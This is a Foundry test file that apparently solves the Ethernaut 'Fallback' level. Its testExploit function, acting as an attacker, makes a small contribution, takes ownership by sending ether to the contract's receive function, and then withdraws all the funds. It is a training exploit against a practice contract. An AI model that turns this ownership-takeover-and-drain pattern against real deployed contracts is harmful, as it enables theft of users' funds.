// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Utilities} from "./utilities/Utilities.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Utilities internal utils;
    Fallback internal _fallback;

    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);

        attacker = users[0];

        vm.label(attacker, "Attacker");

        _fallback = new Fallback();
        vm.label(address(_fallback), "Fallback Contract");

        console.log("Owner", _fallback.owner());
    }

    function testExploit() public {
        // Sets msg.sender for all subsequent calls
        vm.startPrank(attacker);

        // send ether to the contribute function
        _fallback.contribute{value: 0.0001 ether}();

        // take ownership
        (bool success, ) = address(_fallback).call{value: 0.01 ether}("");
        require(success, "Failed to send ether to the contract");

        // withdraw all ether as owner
        _fallback.withdraw();

        // stop prank
        vm.stopPrank();
    }
}
